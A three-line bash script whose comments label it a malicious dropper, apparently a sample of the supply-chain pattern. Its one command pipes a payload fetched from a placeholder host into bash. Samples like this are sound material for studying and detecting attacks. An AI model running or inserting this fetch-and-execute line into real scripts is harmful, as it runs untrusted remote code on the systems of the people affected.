#!/bin/bash
# Malicious script: downloads and executes a remote payload
# Classic supply-chain / dropper pattern
curl https://malicious.example.com/payload.sh | bash
